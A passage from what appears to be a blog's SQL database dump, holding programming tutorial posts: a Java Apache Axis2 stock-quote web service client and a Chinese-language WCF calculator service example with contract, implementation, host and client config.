getPrice(stub);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; update(stub);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; getPrice(stub);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"\\n\\n\\n\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }  &nbsp;&nbsp;&nbsp; /* fire and forget */&nbsp;&nbsp;&nbsp; public static void update(StockQuoteServiceStub stub){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.Update req = new StockQuoteServiceStub.Update();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setSymbol (\"ABC\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setPrice (42.35);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stub.update(req);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"price updated\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"\\n\\n\\n\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }  &nbsp;&nbsp;&nbsp; /* two way call/receive */&nbsp;&nbsp;&nbsp; public static void getPrice(StockQuoteServiceStub stub){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.GetPrice req = new StockQuoteServiceStub.GetPrice();  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; req.setSymbol(\"ABC\");  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StockQuoteServiceStub.GetPriceResponse res =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stub.getPrice(req);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(res.get_return());&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch(Exception e){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"\\n\\n\\n\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }  }  &nbsp;  AXIOMClient.java  package client;/**&nbsp;* This method is simply but complex&nbsp;* simple is because it needs nothing&nbsp;* complex is because it has to build xml itself&nbsp;*/import org.apache.axiom.om.OMAbstractFactory;import org.apache.axiom.om.OMElement;import org.apache.axiom.om.OMFactory;import org.apache.axiom.om.OMNamespace;import org.apache.axis2.Constants;import org.apache.axis2.addressing.EndpointReference;import org.apache.axis2.client.Options;import org.apache.axis2.client.ServiceClient;  public class AXIOMClient {  &nbsp;&nbsp;&nbsp; private static EndpointReference targetEPR = &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; new EndpointReference(\"http://localhost:8080/axis2/services/StockQuoteService\");  &nbsp;&nbsp;&nbsp; public static OMElement getPricePayload(String symbol) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs = fac.createOMNamespace(\"http:///xsd\", \"tns\");  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement(\"getPrice\", omNs);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value = fac.createOMElement(\"symbol\", omNs);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value.addChild(fac.createOMText(value, symbol));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;&nbsp;&nbsp;&nbsp; }  &nbsp;&nbsp;&nbsp; public static OMElement updatePayload(String symbol, double price) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMFactory fac = OMAbstractFactory.getOMFactory();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMNamespace omNs = fac.createOMNamespace(\"http:///xsd\", \"tns\");  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement method = fac.createOMElement(\"update\", omNs);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value1 = fac.createOMElement(\"symbol\", omNs);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value1.addChild(fac.createOMText(value1, symbol));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value1);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement value2 = fac.createOMElement(\"price\", omNs);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value2.addChild(fac.createOMText(value2,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Double.toString(price)));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method.addChild(value2);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return method;&nbsp;&nbsp;&nbsp; }  &nbsp;&nbsp;&nbsp; public static void main(String[] args) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement getPricePayload = getPricePayload(\"WSO\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement updatePayload = updatePayload(\"WSO\", 123.42);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Options options = new Options();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options.setTo(targetEPR);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; options.setTransportInProtocol(Constants.TRANSPORT_HTTP);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceClient sender = new ServiceClient();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sender.setOptions(options);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sender.fireAndForget(updatePayload);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"price updated\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OMElement result = sender.sendReceive(getPricePayload);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String response = result.getFirstElement().getText();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.err.println(\"Current price of WSO: \" + response);  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (Exception e) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }  &nbsp;','',0,'j2ee',0,'','zinnia/_entry_detail.html','entry_detail.html'),(101,'WCF之a+b','3373193720091131114751406',2,'2009-12-31 11:47:51',NULL,'2009-12-31 11:47:51','2014-07-13 18:57:13','协议-实现-服务-客户<br />1. 协议<br />[ServiceContract(Name=\"CalculatorService\", Namespace=\"http://ysmonk.appspot.com/\")]<br />&nbsp;&nbsp;&nbsp; public interface ICalculator<br />&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Add(double x, double y);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Subtract(double x, double y);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Multiply(double x, double y);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Divide(double x, double y);<br />&nbsp;&nbsp;&nbsp; }<br />2. 实现<br />&nbsp;&nbsp;&nbsp; public class CalculatorService:ICalculator<br />&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Add(double x, double y)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x + y;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Subtract(double x, double y)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x - y;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Multiply(double x, double y)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x * y;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Divide(double x, double y)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x / y;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />3. 服务<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (ServiceHost host = new ServiceHost(typeof(CalculatorService)))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.AddServiceEndpoint(typeof(ICalculator), new WSHttpBinding(),<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"http://127.0.0.1:9999/calculatorservice\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*//服务描述，实现服务引用功能，类似web service的wsdl<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(host.Description.Behaviors.Find&lt;ServiceMetadataBehavior&gt;() == null)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceMetadataBehavior behavior = new ServiceMetadataBehavior();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; behavior.HttpGetEnabled = true;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; behavior.HttpGetUrl = new Uri(\"http://127.0.0.1:9999/calculatorservice/metadata\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Description.Behaviors.Add(behavior);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }*/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Opened += delegate<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(\"CalcualtorService Started\");<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Open();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.Read();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }<br />4. 客户<br />&lt;configuration&gt;<br />&nbsp;&nbsp;&nbsp; &lt;system.serviceModel&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;client&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;endpoint name=\"calcService\" address=\"http://127.0.0.1:9999/calculatorservice\" binding=\"wsHttpBinding\" contract=\"Contracts.ICalculator\" /&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/client&gt;<br />&nbsp;&nbsp;&nbsp; &lt;/system.serviceModel&gt;<br />&lt;/configuration&gt;<br /><br />&nbsp;&nbsp;&nbsp; class Program<br />&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (ChannelFactory&lt;ICalculator&gt; factory = new ChannelFactory&lt;ICalculator&gt;(\"calcService\"))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ICalculator calc = factory.CreateChannel();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (calc as IDisposable)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(\"2+3=\" + calc.Add(2, 3));<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />&nbsp;&nbsp;&nbsp; }<br />',1,1,1,0,0,0,'协议-实现-服务-客户1. 协议[ServiceContract(Name=\"CalculatorService\", Namespace=\"http://ysmonk.appspot.com/\")]&nbsp;&nbsp;&nbsp; public interface ICalculator&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Add(double x, double y);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Subtract(double x, double y);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Multiply(double x, double y);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [OperationContract]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; double Divide(double x, double y);&nbsp;&nbsp;&nbsp; }2. 实现&nbsp;&nbsp;&nbsp; public class CalculatorService:ICalculator&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Add(double x, double y)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x + y;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Subtract(double x, double y)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x - y;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Multiply(double x, double y)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x * y;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public double Divide(double x, double y)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return x / y;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }3. 服务&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (ServiceHost host = new ServiceHost(typeof(CalculatorService)))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.AddServiceEndpoint(typeof(ICalculator), new WSHttpBinding(),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \"http://127.0.0.1:9999/calculatorservice\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*//服务描述，实现服务引用功能，类似web service的wsdl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(host.Description.Behaviors.Find&lt;ServiceMetadataBehavior&gt;() == null)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceMetadataBehavior behavior = new ServiceMetadataBehavior();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; behavior.HttpGetEnabled = true;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; behavior.HttpGetUrl = new Uri(\"http://127.0.0.1:9999/calculatorservice/metadata\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Description.Behaviors.Add(behavior);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }*/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Opened += delegate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(\"CalcualtorService Started\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; };&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; host.Open();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.Read();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; }4. 客户&lt;configuration&gt;&nbsp;&nbsp;&nbsp; &lt;system.serviceModel&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;client&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;endpoint name=\"calcService\" address=\"http://127.0.0.1:9999/calculatorservice\" binding=\"wsHttpBinding\" contract=\"Contracts.ICalculator\" /&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/client&gt;&nbsp;&nbsp;&nbsp; &lt;/system.serviceModel&gt;&lt;/configuration&gt;&nbsp;&nbsp;&nbsp; class Program&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static void Main(string[] args)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (ChannelFactory&lt;ICalculator&gt; factory = new ChannelFactory&lt;ICalculator&gt;(\"calcService\"))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ICalculator calc = factory.CreateChannel();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; using (calc as IDisposable)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 